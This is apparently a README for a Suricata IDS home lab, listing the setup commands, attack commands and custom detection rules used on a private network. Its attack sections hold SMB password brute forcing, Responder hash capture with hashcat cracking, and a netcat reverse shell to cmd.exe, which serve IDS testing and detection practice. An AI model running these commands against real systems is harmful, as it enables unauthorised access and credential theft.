# Suricata-NIDS-Lab-
================================================================
SURICATA HOME LAB — ALL COMMANDS AND CODE USED
Kali VM (192.168.18.136) attacking Win11 host (192.168.18.105)
================================================================


----------------------------------------------------------------
1. SURICATA INSTALLATION
----------------------------------------------------------------

sudo apt update && sudo apt install suricata -y
suricata --version

sudo suricata-update
sudo suricata-update list-sources
sudo suricata-update enable-source et/open
sudo suricata-update


----------------------------------------------------------------
2. INTERFACE / NETWORK CHECK
----------------------------------------------------------------

ip a

# (VirtualBox host-only adapter, if used)
sudo ip addr add 192.168.56.10/24 dev eth1
sudo ip link set eth1 up
ip a show eth1

# /etc/network/interfaces static entry
auto eth1
iface eth1 inet static
    address 192.168.56.10
    netmask 255.255.255.0


----------------------------------------------------------------
3. SURICATA CONFIG — /etc/suricata/suricata.yaml
----------------------------------------------------------------

vars:
  address-groups:
    HOME_NET: "[192.168.18.0/24]"
    EXTERNAL_NET: "!$HOME_NET"

af-packet:
  - interface: eth0
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes

rule-files:
  - suricata.rules
  - local.rules


----------------------------------------------------------------
4. RUNNING SURICATA
----------------------------------------------------------------

# Validate config
sudo suricata -T -c /etc/suricata/suricata.yaml -v

# Run in IDS mode (foreground)
sudo suricata -c /etc/suricata/suricata.yaml -i eth0

# Run as a service
sudo systemctl enable suricata
sudo systemctl start suricata
sudo systemctl stop suricata
sudo systemctl restart suricata

# Hot-reload rules without restarting
sudo kill -USR2 $(pidof suricata)


----------------------------------------------------------------
5. WATCHING LOGS
----------------------------------------------------------------

sudo tail -f /var/log/suricata/fast.log
sudo tail -f /var/log/suricata/eve.json | jq .
sudo tail -f /var/log/suricata/stats.log | grep capture
sudo tail -f /var/log/suricata/suricata.log
sudo tail -f /var/log/suricata/fast.log | grep LOCAL

# install jq if missing
sudo apt install jq


----------------------------------------------------------------
6. TRAFFIC / INTERFACE VERIFICATION
----------------------------------------------------------------

sudo tcpdump -i eth0 -c 10
sudo tcpdump -i eth1 -c 10

ping -c 4 192.168.18.105
curl http://testmynids.org/uid/index.html


----------------------------------------------------------------
7. NMAP RECON
----------------------------------------------------------------

nmap -sn 192.168.18.0/24
nmap -sS 192.168.18.105
nmap -sV 192.168.18.105
nmap -O 192.168.18.105
nmap -A 192.168.18.105
nmap -p 3389 192.168.18.105
nmap -p- --min-rate 5000 192.168.18.105
nmap -sV -p 5040,49664,49665,49666,49667,49668,49671,63527 192.168.18.105
nmap --script vuln 192.168.18.105
nmap --script msrpc-enum 192.168.18.105
nmap -p 135 --script rpc-grind 192.168.18.105


----------------------------------------------------------------
8. SMB / NETBIOS ENUMERATION
----------------------------------------------------------------

nmap --script smb-enum-shares,smb-enum-users 192.168.18.105
nmap --script smb2-security-mode 192.168.18.105
nmap --script smb-security-mode 192.168.18.105
nmap --script smb-vuln-ms17-010 192.168.18.105
nmap --script smb-vuln* 192.168.18.105

enum4linux -a 192.168.18.105

# CrackMapExec
crackmapexec smb 192.168.18.105
crackmapexec smb 192.168.18.105 -u guest -p ""
crackmapexec smb 192.168.18.105 -u guest -p "" --shares
crackmapexec smb 192.168.18.105 -u administrator -p /usr/share/wordlists/rockyou.txt

# smbclient
smbclient -L //192.168.18.105 -N
smbclient //192.168.18.105/C$ -N


----------------------------------------------------------------
9. WEB SCANNING
----------------------------------------------------------------

nikto -h http://192.168.18.105
dirb http://192.168.18.105


----------------------------------------------------------------
10. RESPONDER (LLMNR / NBT-NS POISONING)
----------------------------------------------------------------

sudo responder -I eth0 -wv

cat /usr/share/responder/logs/SMB-NTLMv2-*.txt
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt


----------------------------------------------------------------
11. NETCAT REVERSE SHELL TEST
----------------------------------------------------------------

# On Windows target (cmd)
nc 192.168.56.10 4444 -e cmd.exe

# On Kali (listener)
nc -lvnp 4444


----------------------------------------------------------------
12. WINDOWS 11 — FIREWALL / ICMP (PowerShell, Admin)
----------------------------------------------------------------

netsh advfirewall firewall add rule name="Allow ICMPv4" protocol=icmpv4:8,any dir=in action=allow


----------------------------------------------------------------
13. CUSTOM SURICATA RULES — /var/lib/suricata/rules/local.rules
----------------------------------------------------------------

# ============================================
# LOCAL LAB RULES — IBK170 Win11 Target
# Author: ibrahim | Date: 2026-06-29
# ============================================

# --- RECON ---

# Nmap SYN scan burst
alert tcp $HOME_NET any -> $HOME_NET any (msg:"LOCAL Nmap SYN Scan Detected"; flags:S; threshold:type threshold, track by_src, count 20, seconds 2; sid:1000001; rev:1;)

# Nmap full port scan (65535 ports = high rate of SYN packets)
alert tcp $HOME_NET any -> $HOME_NET any (msg:"LOCAL Full Port Scan Detected"; flags:S; threshold:type threshold, track by_src, count 100, seconds 5; sid:1000002; rev:1;)

# Nmap OS/version detection (sends unusual TCP flags)
alert tcp $HOME_NET any -> $HOME_NET any (msg:"LOCAL Nmap XMAS Scan"; flags:FPU; sid:1000003; rev:1;)
alert tcp $HOME_NET any -> $HOME_NET any (msg:"LOCAL Nmap NULL Scan"; flags:0; sid:1000004; rev:1;)

# ICMP ping sweep
alert icmp $HOME_NET any -> $HOME_NET any (msg:"LOCAL ICMP Ping Detected"; itype:8; sid:1000005; rev:1;)

# --- SMB ATTACKS ---

# SMB enumeration burst (enum4linux pattern)
alert tcp $HOME_NET any -> $HOME_NET 445 (msg:"LOCAL SMB Enumeration Burst"; flags:S; flow:to_server; threshold:type threshold, track by_src, count 5, seconds 3; sid:1000010; rev:2;)

# SMB connection to IBK170 specifically
alert tcp $HOME_NET any -> 192.168.18.105 445 (msg:"LOCAL SMB Access Attempt to IBK170"; sid:1000011; rev:1;)

# SMB brute force (crackmapexec pattern)
alert tcp $HOME_NET any -> $HOME_NET 445 (msg:"LOCAL SMB Brute Force Attempt"; flags:S; flow:to_server; threshold:type threshold, track by_src, count 10, seconds 5; sid:1000012; rev:2;)

# NetBIOS enumeration
alert tcp $HOME_NET any -> $HOME_NET 139 (msg:"LOCAL NetBIOS Session Attempt"; sid:1000013; rev:1;)

# MSRPC endpoint access
alert tcp $HOME_NET any -> $HOME_NET 135 (msg:"LOCAL MSRPC Access Attempt"; sid:1000014; rev:1;)

# --- RPC HIGH PORTS ---

# Dynamic RPC port range access (49152-65535)
alert tcp $HOME_NET any -> $HOME_NET 49152:65535 (msg:"LOCAL Dynamic RPC Port Access"; sid:1000020; rev:1;)

# Specific unknown port 5040
alert tcp $HOME_NET any -> $HOME_NET 5040 (msg:"LOCAL Suspicious Port 5040 Access"; sid:1000021; rev:1;)

# --- RESPONDER / LLMNR POISONING ---

# LLMNR query (UDP 5355) - Responder abuses this
alert udp $HOME_NET any -> 224.0.0.252 5355 (msg:"LOCAL LLMNR Query Detected - Possible Responder Target"; sid:1000030; rev:1;)

# NBT-NS query (UDP 137) - also poisoned by Responder
alert udp $HOME_NET any -> $HOME_NET 137 (msg:"LOCAL NBT-NS Query - Possible Responder Target"; sid:1000031; rev:1;)

# Responder itself sending poisoned responses
alert udp $HOME_NET any -> $HOME_NET 5355 (msg:"LOCAL Possible LLMNR Poisoning Response"; sid:1000032; rev:1;)

# --- CREDENTIAL ATTACKS ---

# NTLMv2 hash capture pattern (large SMB auth packet)
alert tcp $HOME_NET any -> $HOME_NET 445 (msg:"LOCAL Possible NTLM Auth Attempt"; content:"|4e 54 4c 4d 53 53 50|"; sid:1000040; rev:1;)

# Multiple failed SMB auth (brute force indicator)
alert tcp $HOME_NET any -> $HOME_NET 445 (msg:"LOCAL SMB Auth Burst - Possible Brute Force"; threshold:type threshold, track by_src, count 5, seconds 10; sid:1000041; rev:1;)

# --- C2 / REVERSE SHELL ---

# Common reverse shell ports
alert tcp $HOME_NET any -> $HOME_NET 4444 (msg:"LOCAL Possible Metasploit Reverse Shell Port 4444"; sid:1000050; rev:1;)
alert tcp $HOME_NET any -> $HOME_NET 1234 (msg:"LOCAL Possible Reverse Shell Port 1234"; sid:1000051; rev:1;)
alert tcp $HOME_NET any -> $HOME_NET 9001 (msg:"LOCAL Possible Reverse Shell Port 9001"; sid:1000052; rev:1;)

# Netcat pattern in payload
alert tcp $HOME_NET any -> $HOME_NET any (msg:"LOCAL Possible Netcat Shell"; content:"cmd.exe"; sid:1000053; rev:1;)

# --- EXFILTRATION ---

# Large outbound data transfer (possible exfil)
alert tcp $HOME_NET any -> !$HOME_NET any (msg:"LOCAL Large Outbound Transfer - Possible Exfil"; dsize:>10000; threshold:type threshold, track by_src, count 5, seconds 10; sid:1000060; rev:1;)

# DNS exfiltration (unusually long DNS query)
alert udp $HOME_NET any -> any 53 (msg:"LOCAL Long DNS Query - Possible DNS Exfil"; dsize:>100; sid:1000061; rev:1;)


----------------------------------------------------------------
14. THRESHOLD SUPPRESSION — /etc/suricata/threshold.conf
----------------------------------------------------------------

suppress gen_id 1, sig_id 2022973


----------------------------------------------------------------
15. RULE FILE LOCATION FIX (path mismatch)
----------------------------------------------------------------

sudo find / -name "local.rules" 2>/dev/null
sudo cp /etc/suricata/rules/local.rules /var/lib/suricata/rules/local.rules
ls -la /var/lib/suricata/rules/local.rules


----------------------------------------------------------------
16. RULE VERIFICATION
----------------------------------------------------------------

sudo grep -n "rule-files" /etc/suricata/suricata.yaml
sudo grep -n "local.rules" /etc/suricata/suricata.yaml
sudo grep -c "alert" /etc/suricata/rules/local.rules
sudo suricata --list-runmodes


----------------------------------------------------------------
17. EVEBOX (OPTIONAL DASHBOARD)
----------------------------------------------------------------

sudo apt install evebox -y
evebox server --datastore sqlite --input /var/log/suricata/eve.json
# http://localhost:5636

================================================================
END OF FILE
================================================================
